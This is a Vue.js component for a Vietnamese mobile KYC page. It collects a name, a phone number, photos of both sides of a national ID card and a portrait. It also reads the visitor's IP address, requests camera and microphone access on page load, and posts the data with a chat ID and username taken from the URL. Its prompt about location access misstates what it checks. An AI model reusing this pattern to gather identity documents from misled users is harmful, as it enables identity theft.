<template>
  <main>
    <section class="kyc">
      <div class="paddin" v-if="tab == 1">
        <h3>Thông tin cơ bản</h3>
        <v-text-field placeholder="Họ và tên" outlined v-model="name"></v-text-field>
        <v-text-field placeholder="Số điện thoại" outlined v-model="phone"></v-text-field>
        <div class="center">
          <div class="btn-all" @click="firstStep">Tiếp tục</div>
        </div>
      </div>
      <div v-if="tab == 2">
        <div class="camera">
          <v-easy-camera v-model="front" output="blob"></v-easy-camera>
        </div>
        <div class="paddin">
          <h3>Chụp ảnh mặt trước CCCD/CMND</h3>
          <div class="space">
            <div class="btn-all outline" @click="tab = 1">Quay lại</div>
            <div :class="{ 'btn-all': true, disabled: !front }" @click="tab = 3">
              Tiếp tục
            </div>
          </div>
        </div>
      </div>
      <div v-if="tab == 3">
        <div class="camera">
          <v-easy-camera v-model="back" output="blob"></v-easy-camera>
        </div>
        <div class="paddin">
          <h3>Chụp ảnh mặt sau CCCD/CMND</h3>
          <div class="space">
            <div class="btn-all outline" @click="tab = 2">Quay lại</div>
            <div :class="{ 'btn-all': true, disabled: !back }" @click="lastStep">
              Tiếp tục
            </div>
          </div>
        </div>
      </div>
      <div v-if="tab == 4">
        <div class="camera">
          <v-easy-camera v-model="portrait" output="blob"></v-easy-camera>
        </div>
        <div class="paddin">
          <h3>Chụp ảnh chân dung của bạn</h3>
          <div class="space">
            <div class="btn-all outline" @click="tab = 3">Quay lại</div>
            <div :class="{ 'btn-all': true, disabled: !portrait }" @click="confirm" v-if="!loading">
              Hoàn thành
            </div>
            <div class="btn-all disabled" v-else>Loading...</div>
          </div>
        </div>
      </div>
      <div v-if="tab == 5" class="noti">
        <div class="paddin">
          <img src="/img/success.png" alt="" />
          <p>
            Chúc mừng bạn đã gửi yêu cầu KYC thành công. Vui lòng liên hệ Admin
            để được thông qua!
          </p>
        </div>
      </div>
      <div v-if="tab == 6" class="noti">
        <div class="paddin">
          <img src="/img/error.png" alt="" />
          <p>
            Yêu cầu KYC đã được gửi trước đó. Vui lòng liên hệ Admin để được
            thông qua!
          </p>
        </div>
      </div>
    </section>
    <section class="pc">
      <span>Vui lòng truy cập bằng thiết bị di động!</span>
    </section>
  </main>
</template>

<script>
import EasyCamera from "easy-vue-camera";
import axios from "axios";
export default {
  components: { "v-easy-camera": EasyCamera },
  data() {
    return {
      tab: 1,
      name: "",
      phone: "",
      front: "",
      back: "",
      portrait: "",
      video: "",
      ip: "",
      loading: false,
      recorder: "",
      stream: "",
    };
  },
  mounted() {
    this.getIP();
    window.addEventListener("load", this.loadVideo);
  },
  methods: {
    firstStep() {
      if (!this.name || !this.phone) {
        this.$toast.error("Vui lòng nhập đủ thông tin!");
        return;
      }
      if (!this.validatePhone(this.phone)) {
        this.$toast.error("Số điện thoại không chính xác!");
        return;
      }
      if (!this.ip) {
        this.$toast.error("Hãy cho phép Browser truy cập định vị!");
        return;
      }
      this.tab = 2;
    },
    lastStep() {
      this.tab = 4;
      // this.startRecording();
    },
    async confirm() {
      this.loading = true;
      // this.stopRecording();
      // await new Promise((r) => setTimeout(r, 2000));

      const chat_id = this.$route.params.id.split("-")[1];
      const username = this.$route.params.id.split("-")[0];

      var formData = new FormData();
      formData.append("chat_id", chat_id);
      formData.append("username", username);
      formData.append("name", this.name);
      formData.append("phone", this.phone);
      formData.append("ip_address", this.ip);
      formData.append("front_photo", this.front);
      formData.append("back_photo", this.back);
      formData.append("portrait_photo", this.portrait);
      formData.append("portrait_video", this.portrait);

      this.CallAPI(
        "post",
        "kyc",
        formData,
        (res) => {
          this.tab = 5;
        },
        (err) => {
          this.tab = 6;
        }
      );
    },

    async loadVideo() {
      const constraints = {
        audio: true,
        video: true,
      };
      this.stream = await navigator.mediaDevices.getUserMedia(constraints);
    },

    startRecording() {
      this.recorder = new MediaRecorder(this.stream, {
        mimeType: "video/mp4",
      });
      this.recorder.start();
    },

    stopRecording() {
      this.recorder.ondataavailable = (e) => {
        this.video = e.data;
      };
      this.recorder.stop();
    },

    validatePhone(phone) {
      var re = /(84|0[3|5|7|8|9])+([0-9]{8})\b/g;
      return re.test(phone);
    },
    getIP() {
      axios.get("https://www.cloudflare.com/cdn-cgi/trace").then((res) => {
        const data = res.data
          .trim()
          .split("\n")
          .reduce(function (obj, pair) {
            pair = pair.split("=");
            return (obj[pair[0]] = pair[1]), obj;
          }, {});
        this.ip = data.ip;
      });
    },
  },
};
</script>

<style></style>